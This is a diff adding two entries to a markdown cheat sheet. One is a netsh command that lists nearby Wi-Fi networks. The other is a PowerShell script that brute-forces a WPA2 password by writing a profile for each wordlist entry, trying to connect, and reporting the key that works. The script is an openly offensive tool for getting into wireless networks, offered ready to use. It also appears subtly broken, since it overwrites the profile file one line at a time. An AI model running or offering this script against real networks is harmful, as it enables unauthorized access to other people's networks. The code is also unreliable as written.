@@ -245,3 +245,91 @@ $wp.foreach({
    }
 })})
 ```
+
+## View wireless networks and signal strength using netsh
+
+```netsh wlan show networks mode=bssid```
+
+## Slow on-line brute-force wireless password in powershell
+
+```powershell
+$ssid = "iPhone"
+$wordlist = @("password",
+              "secretkey!",
+              "wifiaccess",
+              "wifipassword",
+              "1234567890",
+              "Pa55w0rd")
+$xmlfile = "C:\windows\temp\BruteForce.xml"
+$pxml = @'
+<?xml version="1.0"?>
+<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
+   <name>BruteForce</name>
+   <SSIDConfig>
+      <SSID>
+         <hex>------</hex>
+         <name>------</name>
+      </SSID>
+   </SSIDConfig>
+   <connectionType>ESS</connectionType>
+   <connectionMode>auto</connectionMode>
+   <MSM>
+      <security>
+         <authEncryption>
+            <authentication>WPA2PSK</authentication>
+            <encryption>AES</encryption>
+            <useOneX>false</useOneX>
+         </authEncryption>
+         <sharedKey>
+            <keyType>passPhrase</keyType>
+            <protected>false</protected>
+            <keyMaterial>------</keyMaterial>
+         </sharedKey>
+      </security>
+   </MSM>
+</WLANProfile>
+'@
+$ssidhex = ""
+$ssid.ToCharArray() | foreach-object -process {$ssidhex += '{0:X}' -f [int][char]$_}
+(((netsh wlan show interfaces) | out-string ).split("`r`n")).ForEach({
+   if($_ -Like '*Name*')
+   {
+      $t = $_.Split(":")
+      $wlan = $t[1].trim()
+   }
+})
+if($wlan -eq $null)
+{
+   Write-Host "Could not identify the wireless adapter."
+   Exit
+}
+foreach($key in $wordlist)
+{
+   if(Test-Path $xmlfile) {Remove-Item -Path "$xmlfile" -Force}
+   ForEach($line in $($pxml -split "`r`n"))
+   {
+      $line = $line -Replace [regex]::Escape("<hex>------</hex>"),"<hex>$ssidhex</hex>"
+      $line = $line -Replace [regex]::Escape("<name>------</name>"),"<name>$ssid</name>"
+      $line = $line -Replace [regex]::Escape("<keyMaterial>------</keyMaterial>"),"<keyMaterial>$key</keyMaterial>"
+      $line | Out-File "$xmlfile"
+   }
+   netsh wlan add profile filename="$xmlfile" | Out-Null
+   netsh wlan connect name="BruteForce" interface="$wlan" | Out-Null
+   Start-Sleep -s 4
+   $state = ""
+   (((netsh wlan show interfaces interface="$wlan") | out-string ).split("`r`n")).ForEach({
+      if($_ -Like '*State*')
+      {
+         $t = $_.Split(":")
+         $state = $t[1].trim()
+      }
+   })
+   if($state -eq "connected")
+   {
+      Write-Host "Wireless PSK -> $key"
+      netsh wlan delete profile name="BruteForce" | Out-Null
+      Exit
+   }
+   netsh wlan delete profile name="BruteForce" | Out-Null
+}
+```
